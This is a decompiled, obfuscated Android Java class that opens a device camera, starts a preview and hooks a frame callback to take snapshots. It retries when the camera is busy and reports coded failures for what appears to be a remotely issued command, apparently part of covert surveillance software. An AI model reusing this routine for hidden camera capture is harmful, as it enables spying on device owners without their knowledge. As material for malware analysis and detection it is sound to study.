package com.network.media;

import android.hardware.Camera;
import com.network.android.c.a.a;
import com.network.android.c.a.b;

/* access modifiers changed from: package-private */
public final class d implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ boolean f164a;
    final /* synthetic */ int b;
    final /* synthetic */ String c;
    final /* synthetic */ int d;

    d(boolean z, int i, String str, int i2) {
        this.f164a = z;
        this.b = i;
        this.c = str;
        this.d = i2;
    }

    public final void run() {
        try {
            a.a("CameraUtil useCamera tack photo is front: " + this.f164a);
            if (a.f != null) {
                a.a("CameraUtil camera is not available we will try again try in:  3000");
                a.a(this.b, 3000, this.f164a, this.c, this.d);
                return;
            }
            if (this.f164a) {
                Camera unused = a.f = a.c();
                if (a.f == null) {
                    b.a(1, 122, "LOG_CAMERA_SNAPSHOT_FAILED_FRONT");
                    b.a(0, -15534, "", com.network.h.b.c(this.c));
                    return;
                }
            } else {
                Camera unused2 = a.f = Camera.open();
            }
            a.a("CameraUtil useCamera Camera.open();");
            a.f.startPreview();
            a.a("CameraUtil startPreview");
            Camera.PreviewCallback unused3 = a.g = a.a(this.b, this.c, this.d);
            a.f.setPreviewCallback(a.g);
        } catch (Exception e) {
            a.a("CameraUtil useCamera takePhoto front Exception- " + e.getMessage(), e);
            if (this.c != null) {
                b.a(0, 25, "LOG_CAMERA_SNAPSHOT_FAILED", com.network.h.b.c(this.c));
                b.a(0, -15534, "", com.network.h.b.c(this.c));
                return;
            }
            b.a(0, 25, "LOG_CAMERA_SNAPSHOT_FAILED");
        }
    }
}
